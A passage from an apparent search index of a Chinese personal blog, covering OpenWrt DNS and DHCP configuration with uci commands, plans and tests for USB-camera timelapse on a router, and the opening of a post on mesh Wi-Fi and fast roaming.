2409:8a38:1610:9a80::1\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#luci\u754c\u9762\u8bbe\u7f6e","title":"Luci\u754c\u9762\u8bbe\u7f6e","text":"<p>LuCI \u2192 Network \u2192 Interfaces \u2192 WAN &amp; WAN6 \u2192 Edit - Use DNS servers advertised by peer - Use custom DNS servers</p>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#uci\u547d\u4ee4\u884c\u8bbe\u7f6e","title":"Uci\u547d\u4ee4\u884c\u8bbe\u7f6e","text":"<p>\u4f4d\u4e8enetwork\u914d\u7f6e\u6587\u4ef6\u4e2d</p> <pre><code># Configure DNS provider\nuci -q delete network.wan.dns\nuci add_list network.wan.dns=\"119.29.29.29\"\nuci add_list network.wan.dns=\"223.5.5.5\"\nuci add_list network.wan.dns=\"8.8.4.4\"\n\n# Configure IPv6 DNS provider\nuci -q delete network.wan6.dns\nuci add_list network.wan6.dns=\"2400:3200:baba::1\"\nuci add_list network.wan6.dns=\"2402:4e00::\"\nuci add_list network.wan6.dns=\"2001:4860:4860::8888\"\n\n# Disable peer DNS\nuci set network.wan.peerdns=\"0\"\nuci set network.wan6.peerdns=\"0\"\n\n# Save and apply\nuci commit network\n/etc/init.d/network restart\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5e38\u7528dns","title":"\u5e38\u7528dns","text":"<pre><code>\u8c37\u6b4c\n8.8.8.8\n8.8.4.4\n2001:4860:4860::8888\n2001:4860:4860::8844\n\n\u963f\u91cc\n223.5.5.5\n223.6.6.6\n2400:3200::1\n2400:3200:baba::1\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u8bbe\u7f6e\u5ba2\u6237\u7aefdns","title":"\u8bbe\u7f6e\u5ba2\u6237\u7aefDNS","text":"<p>\u53ef\u4ee5\u5728windows\u4e2d\u81ea\u5df1\u8bbe\u7f6edns</p>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u4f7f\u7528dhcp\u9009\u9879\u8bbe\u7f6e\u5ba2\u6237\u7aefdns","title":"\u4f7f\u7528dhcp\u9009\u9879\u8bbe\u7f6e\u5ba2\u6237\u7aefdns","text":"<ul> <li>\u53ef\u4ee5\u4e0d\u4f7f\u7528\u8def\u7531\u5668\u7684DNS\uff0c\u8ba9\u624b\u673a\u7b49\u8bbe\u5907\u76f4\u63a5\u4f7f\u7528\u516c\u5171DNS\u59828.8.8.8</li> <li>\u624b\u52a8\u4fee\u6539\u6bcf\u4e2a\u5ba2\u6237\u7aef\u592a\u9ebb\u70e6\uff0c\u53ef\u4ee5\u4f7f\u7528DHCP\u9009\u9879\u81ea\u52a8\u8bbe\u7f6e</li> </ul> <pre><code># Configure dnsmasq\nuci -q delete dhcp.lan.dhcp_option\nuci add_list dhcp.lan.dhcp_option=\"6,8.8.8.8,8.8.4.4\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n\n# Configure odhcpd\nuci -q delete dhcp.lan.dns\nuci add_list dhcp.lan.dns=\"2001:4860:4860::8888\"\nuci add_list dhcp.lan.dns=\"2001:4860:4860::8844\"\nuci commit dhcp\n/etc/init.d/odhcpd restart\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u8c03\u8bd5","title":"\u8c03\u8bd5","text":"","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#logread","title":"logread","text":"<p>\u5f88\u591a\u65f6\u5019dns\u51fa\u73b0\u95ee\u9898\uff0c\u90fd\u662fdnsmasq\u6ca1\u6709\u6b63\u786e\u542f\u52a8\u5bfc\u81f4\u7684\u3002\u53ef\u4ee5\u901a\u8fc7<code>logread -e dnsmasq</code>\u67e5\u770b\u65e5\u5fd7\u3002</p>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5f00\u542fdns-log","title":"\u5f00\u542fdns log","text":"<pre><code>uci set dhcp.@dnsmasq[0].logqueries=\"1\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5176\u5b83dnsdhcp\u529f\u80fd","title":"\u5176\u5b83DNS/DHCP\u529f\u80fd","text":"","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#dns\u8fc7\u6ee4\u9664\u5e7f\u544a","title":"DNS\u8fc7\u6ee4(\u9664\u5e7f\u544a)","text":"<pre><code># Blacklist\nuci add_list dhcp.@dnsmasq[0].server=\"/example.com/\"\nuci add_list dhcp.@dnsmasq[0].server=\"/example.net/\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n\n# Whitelist\nuci add_list dhcp.@dnsmasq[0].server=\"/example.com/#\"\nuci add_list dhcp.@dnsmasq[0].server=\"/example.net/#\"\nuci add_list dhcp.@dnsmasq[0].server=\"/#/\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#hostname","title":"hostname","text":"<p>LuCI \u2192 Network \u2192 Hostnames</p> <p>Define a custom domain name and the corresponding PTR record - assigns the IPv4 address <code>192.168.1.23</code> and IPv6 address <code>fdce::23</code> to the domain name <code>mylaptop</code> and construct an appropriate reverse records.</p> <pre><code>uci add dhcp domain\nuci set dhcp.@domain[-1].name=\"mylaptop\"\nuci set dhcp.@domain[-1].ip=\"192.168.1.23\"\nuci add dhcp domain\nuci set dhcp.@domain[-1].name=\"mylaptop\"\nuci set dhcp.@domain[-1].ip=\"fdce::23\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#a-aaaa-cname\u8bb0\u5f55","title":"A, AAAA, CNAME\u8bb0\u5f55","text":"<p>\u76f8\u5f53\u4e8eDNS\u57fa\u672c\u529f\u80fd</p> <ul> <li>A, AAAA\u8bb0\u5f55\u7528\u4e8e\u5c06\u57df\u540d\u89e3\u6790\u5230IP</li> <li>\u4e0b\u9762\u8868\u793ahome\u88ab\u89e3\u6790\u4e3a10.10.10.1   <pre><code>uci add_list dhcp.@dnsmasq[0].address=\"/home/10.10.10.1\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre></li> <li>CNAME\u7528\u4e8e\u5c06\u4e00\u4e2a\u57df\u540d\u89e3\u6790\u5230\u53e6\u4e00\u4e2a\u57df\u540d   <pre><code>uci add dhcp cname\nuci set dhcp.@cname[-1].cname=\"ftp.example.com\"\nuci set dhcp.@cname[-1].target=\"www.example.com\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre></li> </ul>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#pxe\u7f51\u7edc\u542f\u52a8","title":"PXE\u7f51\u7edc\u542f\u52a8","text":"<p>https://openwrt.org/docs/guide-user/base-system/dhcp_configuration#multi-arch_tftp_boot</p>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#dhcp-relay","title":"DHCP relay","text":"<p>https://openwrt.org/docs/guide-user/base-system/dhcp#dhcp_relay</p>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5e38\u7528\u7f51\u7edc\u547d\u4ee4","title":"\u5e38\u7528\u7f51\u7edc\u547d\u4ee4","text":"","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#ifconfig","title":"ifconfig","text":"<p>windows <code>ipconfig /all</code>\uff0c\u53ef\u4ee5\u770b\u5230DNS</p> <pre><code>DHCP \u670d\u52a1\u5668 . . . . . . . . . . . : 192.168.37.1\nDHCPv6 IAID . . . . . . . . . . . : 69734824\nDHCPv6 \u5ba2\u6237\u7aef DUID  . . . . . . . : 00-01-00-01-29-89-29-F7-28-11-A8-27-40-3E\nDNS \u670d\u52a1\u5668  . . . . . . . . . . . : 2409:8a38:1610:9a80::1\n192.168.37.1\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#nslookup","title":"nslookup","text":"<pre><code>$ nslookup www.baidu.com\n\u670d\u52a1\u5668:  public1.alidns.com\nAddress:  223.5.5.5\n\n\u975e\u6743\u5a01\u5e94\u7b54:\n\u540d\u79f0:    www.a.shifen.com\nAddresses:  182.61.200.6\n          182.61.200.7\nAliases:  www.baidu.com\n</code></pre>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#dig","title":"dig","text":"","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#netstat","title":"netstat","text":"<pre><code>netstat -ntlp\n</code></pre> <ul> <li>n\uff1a\u4f7f\u7528\u6570\u503c\u7aef\u53e3</li> <li>t\uff1aTCP\u6d41</li> <li>l\uff1a\u663e\u793a\u6b63\u5728\u76d1\u542c\u7684\uff0c\u5426\u5219\u4e3a\u5df2\u7ecf\u5efa\u7acb\u8fde\u63a5\u7684</li> <li>p\uff1a\u663e\u793a\u5bf9\u5e94\u7a0b\u5e8f</li> </ul>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u9ad8\u7ea7","title":"\u9ad8\u7ea7","text":"","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u591adnsmasq\u5b9e\u4f8b","title":"\u591adnsmasq\u5b9e\u4f8b","text":"<p>\u7531\u4e8e\u6211\u533a\u5206\u4e86lan\u548cguest\u63a5\u53e3\u3002</p> <p>\u60f3\u8981\u4e0d\u540c\u7684\u63a5\u53e3\u7ed1\u5b9a\u4e0d\u540c\u7684search domain\u3002</p> <p>\u7ecf\u8fc7\u67e5\u627e\uff0c\u8c8c\u4f3c\u53ea\u80fd\u901a\u8fc7\u542f\u7528\u591a\u4e2adnsmasq\u5b9e\u4f8b\u6765\u5b9e\u73b0\uff0c\u7136\u540e\u901a\u8fc7instance\u53c2\u6570\uff0c\u5728\u4e0d\u540c\u63a5\u53e3\u4e0a\u7ed1\u5b9a\u5230\u4e0d\u540c\u5b9e\u4f8b\u3002 Different domain for each interface - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum [OpenWrt Wiki] DNS and DHCP examples --- [OpenWrt Wiki]DNS \u548c DHCP \u793a\u4f8b</p> <p>\u4f46\u662f\u5b9e\u73b0\u540e\uff0c\u53d1\u73b0\u4e24\u4e2asearch domain\u95f4\u4e0d\u662f\u9694\u79bb\u7684\uff0cguest\u4e0b\u660e\u660e\u6ca1\u6709\u4e00\u4e9bhost\uff0c\u4f46\u662f\u4ecd\u7136\u80fd\u591f\u89e3\u6790\u3002 \u6298\u817e\u4e86\u4e00\u5708\u8c8c\u4f3c\u6ca1\u6709\u89e3\u51b3\uff0c\u56e0\u6b64\u8fd8\u662f\u4f7f\u7528\u5355\u4e2asearch domain\u7b97\u4e86\u3002 <pre><code>64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=31 ttl=64 time=0.060 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=32 ttl=64 time=0.240 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=33 ttl=64 time=0.058 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=34 ttl=64 time=0.080 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=35 ttl=64 time=0.063 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=36 ttl=64 time=0.072 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=37 ttl=64 time=0.055 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=38 ttl=64 time=0.049 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=39 ttl=64 time=0.078 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=40 ttl=64 time=0.045 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=41 ttl=64 time=0.060 ms\n</code></pre></p>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#ipv6\u56fe\u7247\u663e\u793a\u4e0d\u51fa\u6765","title":"ipv6\u56fe\u7247\u663e\u793a\u4e0d\u51fa\u6765","text":"<p>qq\u3001\u54b8\u9c7c\u7b49app\u56fe\u7247\u52a0\u8f7d\u4e0d\u51fa\u6765\uff0c\u5173\u6389\u518d\u5f00\u542fwifi\u5c31\u6062\u590d\u6b63\u5e38\u3002 \u6000\u7591\uff1a - ipv6 dns\u7684\u95ee\u9898 - linux\u4e0b\u9700\u8981\u4e0d\u65adflush neighbor\uff0c\u5426\u5219ipv6\u5c31\u4f1a\u65e0\u6cd5\u8fde\u63a5\u3002\u662f\u5426\u548c\u8be5\u95ee\u9898\u6709\u5173\uff1f - \u6709\u65f6\u9700\u8981ping\u4e00\u4e0b\u8def\u7531\u5668\uff0c\u5426\u5219ipv6\u65e0\u6cd5\u8fde\u63a5\u7f51\u7edc\u3002</p> <p>ipv6\u8986\u76d6\uff1a - IPv6 Measurement Maps (apnic.net)</p> <p>\u53c2\u8003\uff1a ipv6\u7684\u4e00\u4e9b\u6bdb\u75c5 - \u7535\u8111\u8ba8\u8bba(\u65b0) - Chiphell - \u5206\u4eab\u4e0e\u4ea4\u6d41\u7528\u6237\u4f53\u9a8c</p>","tags":["openwrt","dns","ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/","title":"\u4f7f\u7528openwrt\u8def\u7531\u5668\u548cusb\u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71","text":"","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u4f5c\u7528","title":"\u4f5c\u7528","text":"<p>\u653e\u5728\u697c\u9876\uff0c\u62cd\u6444\u4e00\u592924h\u7684\u6237\u5916\u5f55\u50cf\u3001\u5ef6\u65f6\u6444\u5f71\u3002\u50cf\u8d85\u7ea7\u5c0f\u6840\u6bcf\u5929\u7684\u76f4\u64ad\u5f55\u5c4fp1\u90a3\u6837\u3002</p> <ul> <li>\u53ef\u4ee5\u8fdc\u7a0b\u901a\u8fc7\u7f51\u9875\u5b9e\u65f6\u67e5\u770b\u6444\u50cf\u5934\u76f4\u64ad\u753b\u9762</li> </ul>","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u95ee\u9898","title":"\u95ee\u9898","text":"<ul> <li>\u6811\u8393\u6d3e+usb\u6444\u50cf\u5934\u624b\u52a8DIY\uff1f</li> <li>\u80fd\u5426\u65e7\u624b\u673a\u6539\u9020\uff08\u6444\u50cf\u5934\u753b\u8d28\u79d2\u6740\uff09</li> <li>\u80fd\u5426\u4f7f\u7528\u8def\u7531\u5668\u66ff\u4ee3\u6811\u8393\u6d3e\uff08\u6709\u4e00\u4e2a\u95f2\u7f6e\u7684\u5c0f\u7c73\u8def\u7531\u56683G\uff0c\u5e26USB 3.0\u53e3\uff09<ul> <li>USB camera on router with OpenWrt and MJPG-Streamer and shinobi cctv on docker in your home network - YouTube</li> <li>MIPS mtk7261\u4e32\u6d41\uff0cCPU\u6027\u80fd\u662f\u5426\u8db3\u591f\uff08MIPS\u00ae 1004KEc\u2122 dual-core CPU @880MHz\uff09</li> <li>OpenWrt Forum Archive\uff1a<ul> <li>TL-MR3020: MIPS 24kc@400MHz</li> <li>720p@30\u4e0bCPU\u8d1f\u8f7d19-32%</li> </ul> </li> <li>MIPS32 - DeviWiki (ex WikiDevi)<ul> <li>24kc: 3.1coremark/MHz</li> <li>1004KEc: 3.05 coremark/MHz</li> </ul> </li> </ul> </li> <li>\u597d\u5947\u6dd8\u5b9d\u4e0a169\u7684\u7f51\u7edc\u76d1\u63a7\u6444\u50cf\u5934\u4ea7\u54c1\u5185\u90e8\u4f7f\u7528\u7684\u662f\u4ec0\u4e48CPU</li> <li>\u53ef\u4ee5\u624b\u673aapp\u8fdc\u7a0b\u67e5\u770b</li> <li>\u6709\u4e91\u53f0\uff0c\u53ef\u4ee5\u8c03\u6574\u89c6\u89d2</li> <li>\u5c45\u7136\u8fd8\u6709\u592a\u9633\u80fd\u4f9b\u7535\u7248\u672c\uff0c\u529f\u8017\u5f88\u4f4e\uff1f</li> <li>\u8d85\u7ea7\u5c0f\u6840\u90a3\u6837\u7684\u753b\u9762\u9700\u8981\u591a\u9ad8\u5206\u8fa8\u7387\uff08\u9700\u8981\u600e\u6837\u7684\u6444\u50cf\u5934\uff09</li> <li>\u4e0d\u77e5\u9053\u62cd\u5929\u7a7a\u6237\u5916\uff0c\u666e\u901a\u7684\u76d1\u63a7\u6444\u50cf\u5934\u753b\u9762\u6548\u679c</li> <li>\u662f\u5426\u9700\u8981\u5e7f\u89d2\u6444\u50cf\u5934</li> <li>\u80fd\u5426\u96c6\u6210\u6e29\u5ea6\uff0c\u6e7f\u5ea6\u76d1\u63a7\u3002\u6216\u8005\u5982\u4f55\u901a\u8fc7\u7f51\u7edc\u83b7\u53d6\uff0c\u663e\u793a\u5728\u753b\u9762\u5de6\u4e0a\u89d2\u3002</li> </ul>","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u4e86\u89e3","title":"\u4e86\u89e3","text":"<ul> <li>usb\u6444\u50cf\u5934\uff0c\u5f88\u4fbf\u5b9c\uff08\u6dd8\u5b9d20\u5143\uff09</li> <li>\u9700\u8981\u652f\u6301UVC\u514d\u9a71</li> <li>openwrt\u4f7f\u7528kmod-video-uvc\u9a71\u52a8usb\u6444\u50cf\u5934\u3002\u4e32\u6d41</li> <li>MJPG-Streamer</li> <li>ffmpeg/ffserver</li> <li>gstreamer</li> <li>usb\u6444\u50cf\u5934\u652f\u6301\u4ec0\u4e48\u683c\u5f0f\u7f16\u7801</li> <li>YUY2\uff1a\u6ca1\u538b\u7f29\uff0c\u5bf9\u4e0a\u4f4d\u673a\u6027\u80fd\u8981\u6c42\u9ad8</li> <li>MJPEG \u5e26\u5bbd\u8981\u6c42\u9ad8 1080p@30 1680 - 2700 kB/s</li> <li>webcam\u542b\u4e49</li> <li>Webcam - Wikipedia</li> <li>\u65e9\u671f\u8868\u793a\u4f4e\u6210\u672c\u7684\u4f4e\u7aef\u7684\u6444\u50cf\u5934\uff0c\u5982\u7b14\u8bb0\u672c\u524d\u7f6e\u6444\u50cf\u5934\u3002\u4f46\u5982\u4eca\u57fa\u672c\u90fd\u4e3a720p\u4ee5\u4e0a\u4e86</li> <li>90\u5ea6FOV\u7528\u4e8e\u5bb6\u5ead\u548c\u76f4\u64ad\u8db3\u591f\u3002\u66f4\u5927\u7684\u9002\u5408\u4e2d\u5927\u578b\u4f1a\u8bae\u5ba4</li> </ul>","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u6444\u50cf\u5934","title":"\u6444\u50cf\u5934","text":"<ul> <li>\u7b14\u8bb0\u672c\u6444\u50cf\u5934\u6548\u679c\uff1a1280x720 </li> </ul> <ul> <li>69 1080p\u6444\u50cf\u5934</li> </ul> <ul> <li> <p>Review of the ELP-USBFHD01M camera (joancharmant.com)</p> </li> <li> <p>\u7f57\u6280C920: 400\u3002\u76f4\u64ad\u6444\u50cf\u5934\uff0c1080p\uff0c300\u4e07</p> </li> <li> <p>\u7f57\u6280C270i: 100\u3002\u65e5\u5e38\u89c6\u9891\u3002720p</p> </li> <li> <p>elgato: https://www.bilibili.com/video/BV1gY411s7zH</p> </li> <li> <p>https://www.bilibili.com/video/BV1WN4y157hA</p> </li> </ul>","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u57fa\u672c\u65b9\u6848","title":"\u57fa\u672c\u65b9\u6848","text":"<ul> <li>host\uff1ami r3g</li> <li> <p>usb\u6444\u50cf\u5934\uff1a</p> </li> <li> <p>usb\u6444\u50cf\u5934\u6a21\u5757</p> </li> <li></li> </ul> <p>\u8f6f\u4ef6</p> <ul> <li>openwrt:[OpenWrt Wiki] USB Video Support</li> <li>motion: Motion (motion-project.github.io)<ul> <li>live stream</li> <li>timelapse video</li> <li>many type device</li> <li>network camera via RTSP, RTMP, HTTP</li> <li>V4L2 webcams</li> <li>Video capture cards</li> <li>Existing movie files</li> </ul> </li> </ul>","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u6d4b\u8bd5","title":"\u6d4b\u8bd5","text":"<ul> <li>640x480@30 BW=25Mb, CPU \u5355\u6838&lt;10%\uff0c3\u7ebf\u7a0b\u603b&lt;20%\uff0c\u5f85\u673a6%</li> <li>1080p @30 BW=53Mb, CPU\u5355\u683822%, \u603b 44%\uff0c\u5f85\u673a20%</li> <li>1280x720 @30 BW=36Mb\uff0cCPU 30%\uff0c\u5f85\u673a10%</li> <li>\u753b\u9762\u8fd8\u884c\uff0c\u6bd4\u8f83\u5408\u9002</li> </ul>","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u76d1\u63a7","title":"\u76d1\u63a7","text":"<p>\u5982\u4f55\u9009\u62e9\u5b89\u9632\u76d1\u63a7\u6444\u50cf\u673a\uff1f - \u77e5\u4e4e (zhihu.com)</p>","tags":["openwrt","usb\u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/","title":"Openwrt Mesh\u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e","text":"","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u5bb6\u91cc\u539f\u672c\u6709\u4e24\u4e2a\u8def\u7531\u5668\uff0c\u4e00\u4e2a\u8d1f\u8d23\u697c\u4e0a\uff0c\u4e00\u4e2a\u8d1f\u8d23\u697c\u4e0b\u3002\u4f46\u662f\u4ecd\u7136\u6709\u8bb8\u591a\u8986\u76d6\u4e0d\u5230\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u53a8\u623f\u3002\u5e76\u4e14\u66f4\u5f71\u54cd\u4f53\u9a8c\u7684\u662f\u697c\u4e0a\u697c\u4e0b\u7684WIFI\u4f7f\u7528\u4e0d\u540c\u7684SSID\uff0c\u624b\u673a\u65e0\u6cd5\u5f88\u597d\u5730\u81ea\u52a8\u5207\u6362\u3002\u7ecf\u5e38\u662f\u697c\u4e0a\u8fde\u63a5\u5230\u697c\u4e0b\u7684\u7f51\u7edc\u5bfc\u81f4\u4fe1\u53f7\u5f88\u5dee\u3002\u56e0\u6b64\u51b3\u5b9a\u5bf9\u5bb6\u91cc\u7684\u7f51\u7edc\u6539\u9020\u4e00\u756a\u3002</p> <p>\u4ee5\u524d\u542c\u8fc7mesh\u8fd9\u4e2a\u6280\u672f\uff0c\u53ef\u4ee5\u5c06\u5f88\u591a\u53f0\u8def\u7531\u5668\u901a\u8fc7\u65e0\u7ebf\u8fde\u63a5\u8d77\u6765\uff0c\u5171\u540c\u63d0\u4f9b\u4e00\u4e2a\u7f51\u7edc\u3002\u4e8e\u662f\u53bb\u641c\u7d22\u4e86openwrt\u662f\u5426\u652f\u6301mesh\uff0c\u53d1\u73b0\u662f\u53ef\u4ee5\u7684\u3002\u5e76\u4e14\u7ecf\u8fc7\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\uff0c\u7ea0\u6b63\u4e86\u81ea\u5df1\u4e4b\u524d\u5bf9\u65e0\u7ebf\u7f51\u7edc\u7684\u4e00\u4e9b\u9519\u8bef\u8ba4\u77e5\u3002 - \u9996\u5148\uff0cmesh\u89e3\u51b3\u7684\u5e76\u4e0d\u662f\u5982\u4f55\u8ba9\u8bbe\u5907\u81ea\u52a8\u5207\u6362\u7f51\u7edc\uff0c\u800c\u662f\u5982\u4f55\u8fdb\u884c\u65e0\u7ebf\u7ec4\u7f51\uff0c\u53ef\u4ee5\u907f\u514d\u5e03\u7ebf\u7684\u56f0\u96be\u3002mesh\u8282\u70b9\u901a\u8fc7\u540c\u4e00\u4e2a\u4fe1\u9053\u7684\u7684\u65e0\u7ebf\u76f8\u4e92\u8fde\u63a5\uff0c\u800c\u901a\u8fc7\u53e6\u4e00\u4e2a\u65e0\u7ebf\u63d0\u4f9bWIFI\u3002 - \u5feb\u901f\u6f2b\u6e38(fast 